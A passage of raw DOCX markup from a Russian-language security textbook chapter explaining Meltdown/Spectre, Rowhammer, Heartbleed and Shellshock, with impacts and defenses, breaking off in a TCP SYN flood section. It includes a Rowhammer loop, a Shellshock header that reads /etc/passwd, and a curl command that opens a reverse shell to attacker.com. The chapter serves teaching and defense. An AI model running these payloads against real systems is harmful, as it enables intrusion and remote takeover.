        <w:t>Sony отозвала **22 миллиона дисков**, заплатила **$5.75 млн** в судебных издержках</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Детекторы rootkit**: `rkhunter`, `chkrootkit`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UEFI Secure Boot** (проверка подписи загрузчика)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kernel integrity checks** (например, Linux Kernel Runtime Guard — LKRG)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.6. Аппаратные уязвимости: Когда уязвим процессор, а не код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Meltdown и Spectre (2018)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Уязвимости в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CPU</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, связанные с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>спекулятивным выполнением</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> инструкций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что такое спекулятивное выполнение?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Процессор </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>предсказывает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ветвление кода и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>исполняет инструкции заранее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (чтобы не простаивать в ожидании условия).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if (user_has_access) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    data = read_secret();  // ← CPU исполняет ЭТО даже ДО проверки if!</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если предсказание неверное, результат </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>откатывается</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. НО: данные уже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>попали в кэш</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CPU!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер вызывает код, который **читает секретные данные**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>CPU спекулятивно исполняет чтение → данные попадают в кэш</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер измеряет **время доступа к кэшу** (cache timing attack) → восстанавливает данные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Meltdown</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (CVE-2017-5754):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость в **Intel CPU** (почти все процессоры с 1995 года)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позволяет **user-mode процессу** читать **kernel memory** (пароли, ключи, данные других процессов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Spectre</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (CVE-2017-5753, CVE-2017-5715):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость в **Intel, AMD, ARM**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позволяет процессу читать память **других процессов** (обход изоляции)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные последствия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Затронуты **миллиарды устройств** (ПК, серверы, смартфоны)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Патчи **замедляют** производительность на **5-30%**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Облачные провайдеры** (AWS, Google Cloud, Azure) экстренно патчили серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микрокод CPU** (обновление прошивки процессора)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**KPTI (Kernel Page Table Isolation)** — изоляция памяти ядра (Linux patch)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Retpoline** (техника компиляции для обхода Spectre)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Даже железо уязвимо</w:t>
      </w:r>
      <w:r>
        <w:t>. Аппаратные баги невозможно исправить патчем софта → нужно менять процессор (или мириться с замедлением).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Rowhammer (2014)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физическая атака на DRAM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, позволяющая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>изменить биты в памяти</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> без программного доступа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В DRAM данные хранятся в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конденсаторах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (заряд = 1, нет заряда = 0). Конденсаторы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>теряют заряд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> со временем → нужна периодическая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перезарядка (refresh)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер **многократно читает** одну строку памяти (row) — миллионы раз в секунду</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Из-за **электромагнитной интерференции** соседние строки теряют заряд быстрее</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если не успели сделать refresh → **биты меняются** (1 → 0 или 0 → 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эксплойт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while (1) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    *addr1;  // Читаем одну строку памяти</w:t>
        <w:br/>
        <w:t xml:space="preserve">    *addr2;  // Читаем другую строку</w:t>
        <w:br/>
        <w:t xml:space="preserve">    clflush(addr1);  // Сбрасываем кэш</w:t>
        <w:br/>
        <w:t xml:space="preserve">    clflush(addr2);</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>// Через несколько миллионов итераций → биты в соседней строке изменились</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Escape из виртуальной машины** (VM → хост)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обход защиты памяти** (изменение page table → доступ к kernel memory)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Повышение привилегий** (изменение uid в памяти: `uid=1000` → `uid=0` (root))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Google Project Zero (2015)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исследователи использовали Rowhammer для:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Побега из Chrome sandbox** (Native Client)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Получения root на Android** (изменение memory management unit)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ECC память** (Error-Correcting Code) — автоматическое исправление ошибок (дорого, используется в серверах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Target Row Refresh (TRR)** — новые чипы DRAM следят за частотой обращений и делают refresh соседних строк</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограничение clflush** (процессор не даёт сбрасывать кэш слишком часто)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Можно атаковать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>память физически</w:t>
      </w:r>
      <w:r>
        <w:t>, даже без багов в коде.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Heartbleed (2014)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Buffer overflow в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OpenSSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (библиотека для HTTPS), позволяющий читать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>64 КБ памяти сервера</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> за один запрос.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть уязвимости</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">OpenSSL реализует расширение TLS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Heartbeat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (проверка, что соединение живо):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент отправляет: `"ping"` (4 байта) + длина `4`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер отвечает: `"ping"` (эхо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Баг</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>// Уязвимый код OpenSSL</w:t>
        <w:br/>
        <w:t>unsigned int payload_length = request-&gt;length;  // Клиент указывает длину</w:t>
        <w:br/>
        <w:t>memcpy(response, request-&gt;payload, payload_length);  // НЕТ ПРОВЕРКИ РЕАЛЬНОЙ ДЛИНЫ!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эксплойт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет: `"A"` (1 байт) + длина `65535` (врёт о длине!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер копирует **65535 байт** из памяти → отправляет хакеру</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Хакер получает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>случайный кусок памяти сервера</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароли пользователей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session cookies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Приватные ключи SSL-сертификатов (!!!!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные последствия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Затронуто **17%** всех HTTPS-серверов (~500,000 сайтов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Yahoo, Imgur, OKCupid, Eventbrite и др.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Канадское налоговое агентство**: украдены данные **900 налогоплательщиков**, сайт закрыли на 6 часов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновить OpenSSL** до версии 1.0.1g (патч вышел через 2 дня после раскрытия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Перевыпустить SSL-сертификаты** (т.к. приватные ключи могли утечь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сменить пароли** (т.к. могли утечь session cookies)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Даже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один байт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> неправильного кода в критичной библиотеке может взломать половину интернета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Shellshock (2014)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Уязвимость в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Unix shell), позволяющая выполнять произвольные команды через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>переменные окружения</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть уязвимости</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Bash позволяет определять функции через переменные окружения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>export myfunction='() { echo "Hello"; }'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Баг</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Bash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выполнял код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> после определения функции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>export myfunction='() { echo "Hello"; }; echo "PWNED"'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При запуске bash → выполнится `echo "PWNED"`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эксплойт через CGI</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Веб-серверы передают HTTP-заголовки в переменные окружения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>HTTP_USER_AGENT="() { :; }; /bin/bash -c 'cat /etc/passwd'"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Когда CGI-скрипт запускает Bash → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выполняется произвольная команда</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>curl -A "() { :; }; /bin/bash -c 'nc attacker.com 1234 -e /bin/sh'" http://victim.com/cgi-bin/script.sh</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сервер выполнит обратное подключение (reverse shell) → хакер получит доступ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последствия</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Затронуты **миллионы серверов** (Linux, macOS, роутеры, IoT-устройства)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ботнет Mayhem** использовал Shellshock для заражения серверов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обновить Bash** (патч вышел за 1 день)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключить CGI** (если не используется)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WAF (Web Application Firewall)** — блокировка запросов с `() { :; };`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.6.7. Сетевые атаки (детали): Как ломать TCP/IP на низком уровне</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>TCP SYN Flood</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Переполнение очереди</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> полуоткрытых TCP-соединений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает TCP handshake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (трёхстороннее рукопожатие):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Клиент → SYN → Сервер</w:t>
        <w:br/>
        <w:t>Сервер → SYN-ACK → Клиент</w:t>
        <w:br/>
        <w:t>Клиент → ACK → Сервер</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет миллионы **SYN-пакетов** с **поддельными IP** (IP spoofing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
